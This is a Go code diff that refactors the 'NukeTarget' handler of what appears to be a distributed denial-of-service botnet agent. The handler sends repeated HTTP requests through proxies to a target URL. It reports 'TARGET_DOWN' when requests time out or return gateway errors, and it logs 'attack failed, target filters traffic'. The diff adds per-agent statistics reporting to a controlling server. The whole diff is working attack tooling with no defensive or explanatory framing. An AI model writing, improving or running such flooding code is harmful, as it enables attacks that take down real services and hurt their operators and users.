@@ -15,7 +15,7 @@ import (
 	"github.com/pkg/errors"
 )
 
-func NukeTarget(amountRequests int64) command.Handler {
+func NukeTarget(amountRequests int64, agentUID string) command.Handler {
 	return &command.BaseHandler{
 		Type: "NUKE_TARGET",
 		HandleFunc: func(ctx context.Context, w command.EventWriter, e command.Event) {
@@ -34,12 +34,6 @@ func NukeTarget(amountRequests int64) command.Handler {
 				return
 			}
 
-			client, err := client.WithProxy(target.Proxy)
-			if err != nil {
-				w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target proxy record")))
-				return
-			}
-
 			hits := 0
 			for i := amountRequests; i > 0; i-- {
 				select {
@@ -48,31 +42,13 @@ func NukeTarget(amountRequests int64) command.Handler {
 				default:
 				}
 
-				var body io.Reader = nil
-
-				if target.Data != nil {
-					body = bytes.NewReader(target.Data)
-				}
-
-				req, err := http.NewRequest(target.Method, target.URL, body)
-				if err != nil {
-					w.Write(command.NewErrEvent(e, err))
-					return
-				}
-
-				for _, header := range target.Headers {
-					req.Header.Add(header[0], header[1])
-				}
-
-				resp, err := client.Do(req)
+				resp, err := sendRequest(target)
 
 				if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
 					hits++
 
-					w.Write(command.E{
-						Type: "TARGET_DOWN",
-						P:    p,
-					})
+					writeTargetIsDown(w, target, agentUID, p)
+					collectStatistic(w, agentUID, target.ID, 0, 1)
 
 					if hits >= 5 {
 						return
@@ -88,12 +64,14 @@ func NukeTarget(amountRequests int64) command.Handler {
 							errors.Wrap(err, "attack failed, target filters traffic"),
 						),
 					)
+					collectStatistic(w, agentUID, target.ID, 0, 1)
 
 					return
 				}
 
 				if err != nil {
 					w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))
+					collectStatistic(w, agentUID, target.ID, 0, 1)
 
 					continue
 				}
@@ -104,10 +82,8 @@ func NukeTarget(amountRequests int64) command.Handler {
 					resp.StatusCode == http.StatusGatewayTimeout {
 					hits++
 
-					w.Write(command.E{
-						Type: "TARGET_DOWN",
-						P:    p,
-					})
+					writeTargetIsDown(w, target, agentUID, p)
+					collectStatistic(w, agentUID, target.ID, 0, 1)
 
 					if hits >= 5 {
 						return
@@ -116,18 +92,18 @@ func NukeTarget(amountRequests int64) command.Handler {
 					continue
 				}
 
-				if resp.StatusCode < 300 {
-					hits = 0
-
+				hits = 0
+				if resp.StatusCode < 500 {
 					w.Write(command.E{
 						Type: "TARGET_ALIVE",
 						P:    p,
 					})
 
+					collectStatistic(w, agentUID, target.ID, 1, 0)
+
 					continue
 				}
 
-				hits = 0
 				targetErr := dto.TargetError{
 					Target:  *target,
 					ErrCode: resp.StatusCode,
@@ -144,7 +120,58 @@ func NukeTarget(amountRequests int64) command.Handler {
 					Type: "TARGET_ERROR",
 					P:    b,
 				})
+
+				collectStatistic(w, agentUID, target.ID, 0, 1)
 			}
 		},
+	}
+}
+
+func sendRequest(target *dto.Target) (*http.Response, error) {
+	client, err := client.WithProxy(target.Proxy)
+	if err != nil {
+		return nil, errors.Wrap(err, "bad target proxy record")
+	}
+
+	var body io.Reader = nil
+
+	if target.Data != nil {
+		body = bytes.NewReader(target.Data)
+	}
+
+	req, err := http.NewRequest(target.Method, target.URL, body)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, header := range target.Headers {
+		req.Header.Add(header[0], header[1])
+	}
+
+	return client.Do(req)
+}
+
+func writeTargetIsDown(w command.EventWriter, target *dto.Target, agentUID string, p []byte) {
+	w.Write(command.E{
+		Type: "TARGET_DOWN",
+		P:    p,
+	})
+}
+
+func collectStatistic(w command.EventWriter, agentUID string, targetID int, s, e int64) {
+	st, err := json.Marshal(dto.TargetStatistic{
+		Statistic: dto.Statistic{
+			AgentUID: agentUID,
+			Success:  s,
+			Error:    e,
+		},
+		TargetID: targetID,
+	})
+
+	if err == nil {
+		w.Write(command.E{
+			Type: "COLLECT_STATISTIC",
+			P:    st,
+		})
 	}
 }
